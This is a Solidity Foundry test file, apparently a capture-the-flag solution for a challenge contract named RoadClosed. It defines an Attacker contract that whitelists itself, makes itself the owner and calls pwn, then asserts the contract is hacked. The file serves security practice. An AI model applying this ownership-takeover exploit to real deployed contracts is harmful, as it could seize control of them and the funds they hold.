// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./RoadClosed.sol";

contract Attacker {
    constructor(RoadClosed closed_) {
        closed_.addToWhitelist(address(this));
        closed_.changeOwner(address(this));
        closed_.pwn(address(this));
    }
}

contract RoadClosedTest is Test {
    RoadClosed internal _closed;

    function setUp() public {
        _closed = new RoadClosed();
    }

    function test_attack() public {
        new Attacker(_closed);

        assertTrue(_closed.isHacked());
    }
}